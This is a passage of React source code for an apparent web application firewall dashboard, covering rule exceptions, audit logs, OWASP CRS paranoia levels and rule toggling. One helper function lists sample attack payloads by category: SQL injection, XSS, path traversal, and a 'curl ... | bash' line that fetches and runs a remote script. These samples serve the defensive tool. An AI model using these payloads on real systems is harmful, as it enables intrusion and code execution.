            </div>
          </div>

          <div className="table-container glass-panel" style={{ padding: 0 }}>
            {loading ? (
              <div style={{ padding: '40px', textAlign: 'center', color: '#a1a1aa' }}>Syncing exceptions database...</div>
            ) : exclusions.length === 0 ? (
              <NoExceptionsEmptyState />
            ) : (
              <table className="logs-table">
                <thead>
                  <tr>
                    <th>Rule ID</th>
                    <th>Strategy Type</th>
                    <th>Target Scope</th>
                    <th>Created By</th>
                    <th>Justification Notes</th>
                    <th>Status</th>
                    <th style={{ textAlign: 'right' }}>Actions</th>
                  </tr>
                </thead>
                <tbody>
                    {exclusions.map((entry) => {
                      const typeLabels = {
                        uri: 'URI Bypass',
                        parameter: 'Global Param',
                        uri_parameter: 'Param on URI',
                        endpoint_method: 'URI + Method',
                        ip_suppression: 'IP Suppression'
                      };
                      return (
                        <tr
                          key={entry.id}
                          className="log-row"
                        >
                          <td>
                            <span className="log-rule-id" style={{ background: 'rgba(255,255,255,0.05)', color: '#fff', fontSize: '11px', padding: '3px 6px', borderRadius: '4px', fontFamily: 'monospace' }}>
                              {entry.rule_id}
                            </span>
                          </td>
                          <td style={{ fontWeight: 600, fontSize: '12px', color: '#fdba74' }}>
                            {typeLabels[entry.exclusion_type] || entry.exclusion_type}
                          </td>
                          <td style={{ fontFamily: 'monospace', fontSize: '12px', color: '#cbd5e1', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {entry.exclusion_type === 'parameter' && `Param: ${entry.parameter_name}`}
                            {entry.exclusion_type === 'uri' && `URI: ${entry.uri}`}
                            {entry.exclusion_type === 'uri_parameter' && `URI: ${entry.uri} [Param: ${entry.parameter_name}]`}
                            {entry.exclusion_type === 'endpoint_method' && `URI: ${entry.uri} [Method: ${entry.http_method}]`}
                            {entry.exclusion_type === 'ip_suppression' && `URI: ${entry.uri} [IP: ${entry.client_ip}]`}
                          </td>
                          <td style={{ fontSize: '12px', color: '#94a3b8' }}>@{entry.created_by}</td>
                          <td style={{ fontSize: '12px', color: '#94a3b8', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={entry.notes}>
                            {entry.notes}
                          </td>
                          <td>
                            <span
                              onClick={() => handleToggleStatus(entry.id, entry.status)}
                              style={{
                                fontSize: '10px',
                                fontWeight: 700,
                                padding: '3px 8px',
                                borderRadius: '12px',
                                background: entry.status === 'Active' ? 'rgba(16,185,129,0.1)' : 'rgba(239,68,68,0.1)',
                                color: entry.status === 'Active' ? '#a7f3d0' : '#fca5a5',
                                border: entry.status === 'Active' ? '1px solid rgba(16,185,129,0.2)' : '1px solid rgba(239,68,68,0.2)',
                                textTransform: 'uppercase',
                                cursor: 'pointer'
                              }}
                            >
                              {entry.status}
                            </span>
                          </td>
                          <td style={{ textAlign: 'right' }}>
                            <div style={{ display: 'flex', gap: '8px', justifyContent: 'flex-end' }}>
                              <button
                                className="action-btn-inspect"
                                onClick={() => handleInspectExclusion(entry)}
                                style={{ padding: '4px 8px', fontSize: '11px' }}
                              >
                                View Config
                              </button>

                              <button
                                className="action-btn-inspect"
                                onClick={() => {
                                  setEditingExclusion(entry);
                                  setEditNotes(entry.notes);
                                  setIsNoteModalOpen(true);
                                }}
                                style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(59, 130, 246, 0.4)', color: '#93c5fd' }}
                              >
                                Edit Note
                              </button>

                              <button
                                className="action-btn-inspect"
                                onClick={() => handleDeleteExclusion(entry.id)}
                                style={{ padding: '4px 8px', fontSize: '11px', borderColor: 'rgba(239, 68, 68, 0.4)', color: '#fca5a5' }}
                              >
                                Delete
                              </button>
                            </div>
                          </td>
                        </tr>
                      );
                    })}
                </tbody>
              </table>
            )}
          </div>

          {analytics && analytics.top_excluded_rules && analytics.top_excluded_rules.length > 0 && (
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', marginTop: '10px' }}>
              <div className="glass-panel" style={{ padding: '20px' }}>
                <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <AlertTriangle size={16} color="#f97316" />
                  <span>Most Frequently Excluded WAF Rules</span>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  {analytics.top_excluded_rules.map((rule) => (
                    <div key={rule.rule_id} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
                        <span style={{ fontFamily: 'monospace', color: '#fdba74' }}>Rule #{rule.rule_id}</span>
                        <span style={{ fontWeight: 600 }}>{rule.count} Exception Policies</span>
                      </div>
                      <div style={{ width: '100%', height: '5px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden' }}>
                        <div style={{ width: `${Math.min((rule.count / (analytics.top_excluded_rules[0]?.count || 1)) * 100, 100)}%`, height: '100%', background: 'linear-gradient(90deg, #fdba74, #f97316)', borderRadius: '3px' }}></div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="glass-panel" style={{ padding: '20px' }}>
                <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <ShieldCheck size={16} color="#10b981" />
                  <span>Top False Positive Generating Rules (Tuning Candidates)</span>
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  {analytics.top_fp_rules && analytics.top_fp_rules.length > 0 ? (
                    analytics.top_fp_rules.map((rule) => (
                      <div key={rule.rule_id} style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
                          <span style={{ fontFamily: 'monospace', color: '#a7f3d0' }}>Rule #{rule.rule_id}</span>
                          <span style={{ fontWeight: 600 }}>{rule.count} False Positives Flagged</span>
                        </div>
                        <div style={{ width: '100%', height: '5px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden' }}>
                          <div style={{ width: `${Math.min((rule.count / (analytics.top_fp_rules[0]?.count || 1)) * 100, 100)}%`, height: '100%', background: 'linear-gradient(90deg, #a7f3d0, #10b981)', borderRadius: '3px' }}></div>
                        </div>
                      </div>
                    ))
                  ) : (
                    <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '20px' }}>No marked false positives triggers discovered yet.</div>
                  )}
                </div>
              </div>
            </div>
          )}
        </>
      )}

      {activeSubTab === 'audit_history' && (
        <div className="table-container glass-panel" style={{ padding: 0 }}>
          {history.length === 0 ? (
            <div style={{ padding: '60px 40px', textAlign: 'center', color: '#a1a1aa' }}>No exceptions audit history recorded yet.</div>
          ) : (
            <table className="logs-table">
              <thead>
                <tr>
                  <th>Timestamp</th>
                  <th>Action</th>
                  <th>Analyst</th>
                  <th>Exclusion ID Reference</th>
                  <th>Change Event Details</th>
                </tr>
              </thead>
              <tbody>
                {history.map((log) => (
                  <tr key={log.id}>
                    <td style={{ fontSize: '12px', color: '#94a3b8' }}>{formatLocalTime(log.timestamp)}</td>
                    <td>
                      <span style={{
                        fontSize: '9px',
                        fontWeight: 700,
                        padding: '2px 6px',
                        borderRadius: '4px',
                        background: log.action === 'Create' ? 'rgba(16,185,129,0.1)' : log.action === 'Delete' ? 'rgba(239,68,68,0.1)' : 'rgba(59,130,246,0.1)',
                        color: log.action === 'Create' ? '#a7f3d0' : log.action === 'Delete' ? '#fca5a5' : '#93c5fd',
                        textTransform: 'uppercase'
                      }}>
                        {log.action}
                      </span>
                    </td>
                    <td style={{ fontSize: '12px', fontWeight: 500 }}>@{log.username}</td>
                    <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>Ex-Ref #{log.exclusion_id}</td>
                    <td style={{ fontSize: '12px', color: '#cbd5e1' }}>{log.details}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      )}

      <AnimatePresence>
        {isNoteModalOpen && editingExclusion && (
          <div className="modal-overlay" onClick={() => setIsNoteModalOpen(false)}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '440px' }}>
              <div className="modal-header">
                <div className="modal-title">
                  <Database size={18} color="#3b82f6" />
                  <span>Update Exception Justification</span>
                </div>
                <button className="modal-close-btn" onClick={() => setIsNoteModalOpen(false)}>
                  <X size={18} />
                </button>
              </div>
              <form onSubmit={handleSaveNotes}>
                <div className="modal-body" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  {errorMsg && (
                    <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.25)', color: '#fca5a5', padding: '8px 12px', borderRadius: '6px', fontSize: '12px' }}>
                      {errorMsg}
                    </div>
                  )}
                  <div style={{ fontSize: '12px', color: '#a1a1aa' }}>
                    Edit the administrative review notes for Rule <strong style={{ color: '#fff' }}>{editingExclusion.rule_id}</strong> exception:
                  </div>
                  <textarea
                    className="settings-input"
                    style={{ height: '100px', resize: 'none', background: 'rgba(0,0,0,0.2)', padding: '12px' }}
                    placeholder="Enter revised justification notes..."
                    value={editNotes}
                    onChange={(e) => setEditNotes(e.target.value)}
                    maxLength={400}
                    required
                  />
                </div>
                <div className="modal-footer" style={{ display: 'flex', gap: '12px', justifyContent: 'flex-end' }}>
                  <button type="button" className="modal-btn secondary" onClick={() => setIsNoteModalOpen(false)}>Cancel</button>
                  <button type="submit" className="modal-btn primary" style={{ background: '#3b82f6', borderColor: '#3b82f6', color: '#fff', fontWeight: 600 }}>
                    Save Note
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}
      </AnimatePresence>

      <ExclusionDetailsModal
        isOpen={isExclusionModalOpen}
        exclusion={selectedExclusion}
        onClose={() => {
          setIsExclusionModalOpen(false);
          setSelectedExclusion(null);
        }}
      />
    </motion.div>
  );
}

function Rules({ userRole }) {
  const [rules, setRules] = useState([]);
  const [stats, setStats] = useState({
    total_rules: 0,
    enabled_rules: 0,
    disabled_rules: 0,
    paranoia_level: 1,
    top_triggered_rules: [],
    category_distribution: [],
    tuning_candidates: []
  });
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [total, setTotal] = useState(0);
  const size = 10;

  // Filters state
  const [search, setSearch] = useState('');
  const [category, setCategory] = useState('');
  const [severity, setSeverity] = useState('');
  const [statusFilter, setStatusFilter] = useState('');

  // Modals / Drawer state
  const [selectedRule, setSelectedRule] = useState(null);
  const [ruleDetailLoading, setRuleDetailLoading] = useState(false);
  const [detailedRule, setDetailedRule] = useState(null);

  // Rule Disable Confirmation state
  const [ruleToDisable, setRuleToDisable] = useState(null);
  const [disableReason, setDisableReason] = useState('');
  const [disableError, setDisableError] = useState('');

  // Notification states
  const [toast, setToast] = useState(null);

  const showToast = (message, type = 'success') => {
    setToast({ message, type });
    setTimeout(() => setToast(null), 4000);
  };

  const fetchRulesData = async () => {
    setLoading(true);
    try {
      const filters = {};
      if (search) filters.search = search;
      if (category) filters.category = category;
      if (severity) filters.severity = severity;
      if (statusFilter) filters.enabled = statusFilter === 'enabled';

      const [rulesRes, statsRes, historyRes] = await Promise.all([
        getRules(page, size, filters),
        getRulesStats(),
        getRulesHistory()
      ]);

      setRules(rulesRes.data);
      setTotal(rulesRes.total);
      setStats(statsRes);
      setHistory(historyRes);
    } catch (error) {
      console.error("Failed to load WAF rules data:", error);
      showToast("Failed to fetch WAF rules from backend.", "error");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchRulesData();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, category, severity, statusFilter]);

  // Handle Search submit
  const handleSearchSubmit = (e) => {
    e.preventDefault();
    setPage(1);
    fetchRulesData();
  };

  // Inspect rule detail
  const handleInspectRule = async (rule) => {
    setSelectedRule(rule);
    setRuleDetailLoading(true);
    setDetailedRule(null);
    try {
      const detail = await getRuleDetails(rule.id);
      setDetailedRule(detail);
    } catch (error) {
      console.error("Failed to inspect rule details:", error);
      showToast(`Could not load details for rule ${rule.id}`, "error");
    } finally {
      setRuleDetailLoading(false);
    }
  };

  // Toggle rule state (enable directly, show modal overlay for disabling)
  const handleToggleState = async (rule) => {
    if (!rule.enabled) {
      // Enabling rule: execute immediately
      setLoading(true);
      try {
        const res = await enableRule(rule.id);
        showToast(res.message || `Rule ${rule.id} has been enabled successfully.`);
        fetchRulesData();
      } catch (error) {
        showToast(error.message || `Failed to enable rule ${rule.id}`, "error");
        setLoading(false);
      }
    } else {
      // Disabling rule: show confirmation prompt and require a security justification reason
      setRuleToDisable(rule);
      setDisableReason('');
      setDisableError('');
    }
  };

  // Confirm rule disabling override
  const handleConfirmDisable = async () => {
    if (!disableReason || disableReason.trim().length < 3) {
      setDisableError("A valid justification reason is required to proceed.");
      return;
    }

    setLoading(true);
    const targetId = ruleToDisable.id;
    setRuleToDisable(null);

    try {
      const res = await disableRule(targetId, disableReason);
      showToast(res.message || `Rule ${targetId} has been overridden and disabled.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || `Failed to disable rule ${targetId}`, "error");
      setLoading(false);
    }
  };

  // Paranoia Level Change
  const handleParanoiaLevelChange = async (level) => {
    if (level === stats.paranoia_level) return;
    setLoading(true);
    try {
      const res = await setParanoiaLevel(level);
      showToast(res.message || `Global detection paranoia level updated to PL${level}.`);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to update paranoia level", "error");
      setLoading(false);
    }
  };

  // Restore defaults
  const handleRestoreDefaults = async () => {
    if (!window.confirm("Are you sure you want to restore all OWASP CRS rules and paranoia levels to WAF system defaults?")) {
      return;
    }
    setLoading(true);
    try {
      const res = await resetRules();
      showToast(res.message || "WAF settings restored to system default configuration.");
      setPage(1);
      fetchRulesData();
    } catch (error) {
      showToast(error.message || "Failed to restore defaults.", "error");
      setLoading(false);
    }
  };

  // Trigger payload sample mapper based on Category
  const getPayloadSample = (cat) => {
    switch (cat) {
      case "SQL Injection": return ["' OR 1=1 --", "UNION SELECT null, username, password FROM users", "admin' --"];
      case "XSS": return ["<script>alert(1)</script>", "<img src=x onerror=alert(document.domain)>", "javascript:alert(1)"];
      case "LFI": return ["../../../../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe", "/proc/self/environ"];
      case "RCE": return ["cat /etc/passwd", "curl http://malicious.site/shell.sh | bash", "; whoami; id"];
      case "Scanner Detection": return ["Nikto Vulnerability Scanner headers", "sqlmap parameter crawls", "nmap script triggers"];
      default: return ["Blocked anomalous traffic payload match.", "Specialized signature match."];
    }
  };

  return (
    <div className="rules-container">
      {/* Toast Alert overlay */}
      <AnimatePresence>
        {toast && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className={`toast-alert ${toast.type === 'error' ? 'error' : 'success'}`}
            style={{
              position: 'fixed',
              top: '24px',
              right: '24px',
              zIndex: 9999,
              padding: '12px 24px',
              borderRadius: '8px',
              boxShadow: '0 8px 30px rgba(0,0,0,0.5)',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              background: toast.type === 'error' ? 'rgba(239, 68, 68, 0.95)' : 'rgba(16, 185, 129, 0.95)',
              border: '1px solid rgba(255,255,255,0.1)',
              color: '#fff',
              fontWeight: 500
            }}
          >
            <ShieldAlert size={18} />
            <span>{toast.message}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Top Header Card containing metrics summary and paranoia control */}
      <motion.div
        className="glass-panel"
        style={{ padding: '24px', marginBottom: '8px' }}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', flexWrap: 'wrap', gap: '16px' }}>
          <div className="card-title" style={{ margin: 0 }}>
            <ShieldAlert size={20} color="#ef4444" />
            WAF Rule Tuning & Administration
          </div>
          {userRole === 'admin' && (
            <button
              onClick={handleRestoreDefaults}
              className="action-btn-inspect"
              style={{ borderColor: 'rgba(168, 85, 247, 0.3)', color: '#c084fc', background: 'rgba(168, 85, 247, 0.05)' }}
            >
              Reset Overrides
            </button>
          )}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))', gap: '16px', marginBottom: '24px' }}>
          <div className="metric-box" style={{ background: 'rgba(255,255,255,0.01)', border: '1px solid rgba(255,255,255,0.04)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Total CRS Rules</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#f4f4f5', marginTop: '4px' }}>
              {stats.total_rules || rules.length}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(16, 185, 129, 0.02)', border: '1px solid rgba(16, 185, 129, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Active Guards</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#10b981', marginTop: '4px' }}>
              {stats.enabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(239, 68, 68, 0.02)', border: '1px solid rgba(239, 68, 68, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Disabled Tuning Overrides</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#ef4444', marginTop: '4px' }}>
              {stats.disabled_rules}
            </div>
          </div>
          <div className="metric-box" style={{ background: 'rgba(59, 130, 246, 0.02)', border: '1px solid rgba(59, 130, 246, 0.1)', borderRadius: '8px', padding: '12px 16px' }}>
            <div style={{ fontSize: '12px', color: '#a1a1aa' }}>Paranoia Level</div>
            <div style={{ fontSize: '24px', fontWeight: 600, color: '#3b82f6', marginTop: '4px' }}>
              PL {stats.paranoia_level}
            </div>
          </div>
        </div>

        {/* Paranoia Selector Slider */}
        <div style={{ background: 'rgba(255,255,255,0.01)', padding: '16px 20px', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.04)' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ fontSize: '14px', fontWeight: 600, color: '#f4f4f5' }}>OWASP CRS Paranoia Level Setting</div>
              <HelpText>
                Paranoia Level controls how strict the WAF rules are. Level 1 (default) blocks common attacks with minimal false positives. Higher levels add more aggressive rules but may block legitimate traffic. Start with PL1 and increase only if needed.
              </HelpText>
            </div>
            <div style={{ fontSize: '12px', color: '#a1a1aa', marginTop: '2px' }}>Higher paranoia levels add strict rulesets to block advanced attacks but increase risk of false positives.</div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '11px', background: 'rgba(59,130,246,0.1)', color: '#3b82f6', border: '1px solid rgba(59,130,246,0.2)', padding: '3px 8px', borderRadius: '4px', fontWeight: 600 }}>
              ACTIVE: PL{stats.paranoia_level}
            </span>
          </div>

          <div className="paranoia-selector-wrapper">
            {[
              { level: 1, label: 'PL 1: Default', desc: 'Standard protection. Extremely low risk of false triggers. Recommended for core servers.' },
              { level: 2, label: 'PL 2: Strict', desc: 'Adds advanced syntax checking. Best balance of heavy security and business integrity.' },
              { level: 3, label: 'PL 3: Extreme', desc: 'Strict regex filters enabled. Potential false triggers on highly customized APIs.' },
              { level: 4, label: 'PL 4: Paranoid', desc: 'Defense-in-depth absolute guard. Highly restrictive. Ideal for ultra-secure lock-down APIs.' }
            ].map(item => (
              <button
                key={item.level}
                onClick={() => userRole === 'admin' && handleParanoiaLevelChange(item.level)}
                className={`paranoia-level-btn ${stats.paranoia_level === item.level ? 'active' : ''}`}
                style={userRole !== 'admin' ? { cursor: 'not-allowed', opacity: 0.6 } : {}}
                disabled={userRole !== 'admin'}
                title={userRole !== 'admin' ? "Only administrators can change paranoia level" : ""}
              >
                <div style={{ fontWeight: 600, fontSize: '13px', color: stats.paranoia_level === item.level ? '#3b82f6' : '#e4e4e7' }}>{item.label}</div>
                <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>{item.desc}</div>
              </button>
            ))}
          </div>
        </div>
      </motion.div>

      {/* Main Grid View split into Rules grid and Audits sidebar */}
      <div className="rules-grid-layout">

        {/* Left Side: Rule list database and search filters */}
        <motion.div
          className="glass-panel"
          style={{ padding: '24px' }}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
        >
          <div className="card-title" style={{ marginBottom: '20px' }}>
            <Database size={18} color="#3b82f6" />
            OWASP Core Ruleset Registry
          </div>

          {/* Filters Bar */}
          <form onSubmit={handleSearchSubmit} style={{ display: 'flex', gap: '12px', marginBottom: '20px', flexWrap: 'wrap' }}>
            <div className="search-input-wrapper" style={{ flex: 1, minWidth: '200px' }}>
              <Search className="search-icon" size={16} style={{ left: '12px' }} />
              <input
                type="text"
                placeholder="Search rule ID, description..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="search-input"
                style={{ width: '100%', paddingLeft: '36px' }}
              />
            </div>

            <select
              value={category}
              onChange={(e) => { setCategory(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Categories</option>
              {Object.values(CATEGORY_MAP).map(cat => (
                <option key={cat} value={cat}>{cat}</option>
              ))}
            </select>

            <select
              value={severity}
              onChange={(e) => { setSeverity(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <select
              value={statusFilter}
              onChange={(e) => { setStatusFilter(e.target.value); setPage(1); }}
              className="filter-select"
            >
              <option value="">All Statuses</option>
              <option value="enabled">Enabled</option>
              <option value="disabled">Disabled Override</option>
            </select>

            <button type="submit" className="modal-btn primary">
              Apply Filter
            </button>
          </form>

          {/* Rules List Container */}
          {loading ? (
            <div style={{ display: 'flex', justifyContent: 'center', padding: '60px 0' }}>
              <div className="spinner"></div>
            </div>
          ) : rules.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '60px 24px', color: '#a1a1aa' }}>
              <ShieldCheck size={48} style={{ margin: '0 auto 12px', opacity: 0.3, color: '#10b981' }} />
              <h3>No Rules Found</h3>
              <p style={{ fontSize: '13px', marginTop: '6px' }}>Adjust your keyword search or active filter dropdown parameters.</p>
            </div>
          ) : (
            <div className="rules-container">
              {rules.map((rule) => (
                <div
                  key={rule.id}
                  className={`rule-card ${!rule.enabled ? 'disabled' : ''}`}
                >
                  <div className="rule-card-info">
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.08)', padding: '1px 6px', borderRadius: '4px', fontWeight: 600, color: '#f4f4f5' }}>
                        {rule.id}
                      </span>
                      <span style={{ fontWeight: 600, fontSize: '14px', color: rule.enabled ? '#e4e4e7' : '#a1a1aa' }}>{rule.name}</span>

                      {rule.paranoia_level > stats.paranoia_level && (
                        <span style={{ fontSize: '9px', background: 'rgba(234, 179, 8, 0.05)', color: '#eab308', border: '1px solid rgba(234,179,8,0.15)', padding: '1px 5px', borderRadius: '3px', fontWeight: 500 }}>
                          PL {rule.paranoia_level} (Inactive)
                        </span>
                      )}
                    </div>

                    <p style={{ fontSize: '12px', color: '#a1a1aa', margin: '2px 0 6px', lineHeight: '1.4' }}>
                      {rule.description}
                    </p>

                    <div className="rule-card-meta">
                      <span className="category-tag">{rule.category}</span>
                      <span className={`severity-pill ${rule.severity.toLowerCase()}`}>{rule.severity}</span>
                      {rule.hit_count > 0 && (
                        <span style={{ fontSize: '11px', color: '#ef4444', fontWeight: 500, display: 'flex', alignItems: 'center', gap: '4px' }}>
                          <AlertTriangleIcon size={12} />
                          {rule.hit_count} hits recorded
                        </span>
                      )}
                      {rule.last_triggered && (
                        <span style={{ fontSize: '11px', color: '#a1a1aa' }}>
                          Last: {rule.last_triggered}
                        </span>
                      )}
                    </div>
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                    <button
                      onClick={() => handleInspectRule(rule)}
                      className="action-btn-inspect"
                    >
                      Inspect
                    </button>

                    {/* Toggle Guard Switch */}
                    {userRole === 'admin' ? (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        onClick={() => handleToggleState(rule)}
                        style={{ flexShrink: 0 }}
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    ) : (
                      <div
                        className={`toggle-switch ${rule.enabled ? 'active' : ''}`}
                        style={{ flexShrink: 0, opacity: 0.5, cursor: 'not-allowed' }}
                        title="Only administrators can enable or disable rules"
                      >
                        <div className="toggle-knob"></div>
                      </div>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Pagination */}
          {!loading && total > size && (
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '24px', borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
              <span style={{ fontSize: '13px', color: '#a1a1aa' }}>
                Showing <strong>{Math.min(total, (page - 1) * size + 1)}</strong> to <strong>{Math.min(total, page * size)}</strong> of <strong>{total}</strong> rule entries
              </span>
              <div style={{ display: 'flex', gap: '8px' }}>
                <button
                  disabled={page === 1}
                  onClick={() => setPage(p => Math.max(1, p - 1))}
                  className="action-btn-inspect"
                  style={{ opacity: page === 1 ? 0.5 : 1, pointerEvents: page === 1 ? 'none' : 'auto' }}
                >
                  <ChevronLeft size={16} />
                </button>
                <button
                  disabled={page * size >= total}
                  onClick={() => setPage(p => p + 1)}
                  className="action-btn-inspect"
                  style={{ opacity: page * size >= total ? 0.5 : 1, pointerEvents: page * size >= total ? 'none' : 'auto' }}
                >
                  <ChevronRight size={16} />
                </button>
              </div>
            </div>
          )}
        </motion.div>

        {/* Right Side: Tuning Recommendations and CyberSentinel Engine Change History Audits */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>

          {/* Active Tuning Candidates Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Activity size={18} color="#eab308" />
              Tuning Candidates (High Trigger Rates)
            </div>

            {stats.tuning_candidates && stats.tuning_candidates.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {stats.tuning_candidates.map(cand => (
                  <div key={cand.rule_id} style={{ padding: '12px 14px', background: 'rgba(234, 179, 8, 0.02)', border: '1px solid rgba(234, 179, 8, 0.1)', borderRadius: '8px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                      <span style={{ fontSize: '11px', fontFamily: 'monospace', background: 'rgba(234, 179, 8, 0.1)', color: '#eab308', padding: '1px 5px', borderRadius: '4px', fontWeight: 600 }}>
                        {cand.rule_id}
                      </span>
                      <span style={{ fontSize: '12px', color: '#fca5a5', fontWeight: 600 }}>{cand.hit_count} dynamic blocks</span>
                    </div>
                    <div style={{ fontSize: '12px', fontWeight: 600, color: '#f4f4f5' }}>{cand.name}</div>
                    <div style={{ fontSize: '10px', color: '#a1a1aa', marginTop: '6px', lineHeight: '1.4' }}>
                      <strong>Recommendation:</strong> {cand.recommendation}
                    </div>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ textSelf: 'center', textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
                <ShieldCheck size={32} style={{ margin: '0 auto 8px', color: '#10b981', opacity: 0.5 }} />
                No rule overrides recommended. Current trigger rates are stable.
              </div>
            )}
          </motion.div>

          {/* Change Auditing Logs Card */}
          <motion.div
            className="glass-panel"
            style={{ padding: '20px' }}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          >
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <Clock size={18} color="#a855f7" />
              Administrative Audit Logs
            </div>

            <div className="audit-list">
              {history.length === 0 ? (
                <div style={{ textAlign: 'center', padding: '24px 12px', color: '#a1a1aa', fontSize: '12px' }}>
                  No changes recorded in overrides database.
                </div>
              ) : (
                history.map((log, index) => (
                  <div className="audit-item" key={index}>
                    <div className="audit-meta-header">
                      <span style={{ fontWeight: 600 }}>@{log.username}</span>
                      <span>{formatLocalTime(log.timestamp)}</span>
                    </div>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <span className={`audit-action-badge ${log.action}`}>
                        {log.action}
                      </span>
                      {log.rule_id && (
                        <span style={{ fontFamily: 'monospace', fontSize: '11px', color: '#a1a1aa' }}>
                          ID: {log.rule_id}
                        </span>
                      )}
                    </div>
                    <div style={{ color: '#e4e4e7', fontSize: '12px', lineHeight: '1.4', marginTop: '2px' }}>
                      {log.details}
                    </div>
                  </div>
                ))
              )}
            </div>
          </motion.div>
        </div>

      </div>

      {/* --- Overlay Modals Drawer for rule inspection --- */}
      {createPortal(
        <AnimatePresence>
          {selectedRule && (
            <div className="modal-overlay" onClick={() => setSelectedRule(null)}>
              <motion.div
                className="modal-content"
                style={{ maxWidth: '850px' }}
                onClick={(e) => e.stopPropagation()}
                initial={{ scale: 0.95, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.95, opacity: 0 }}
              >
                <div className="modal-header">
                  <div className="modal-title">
                    <ShieldAlert size={20} color="#3b82f6" />
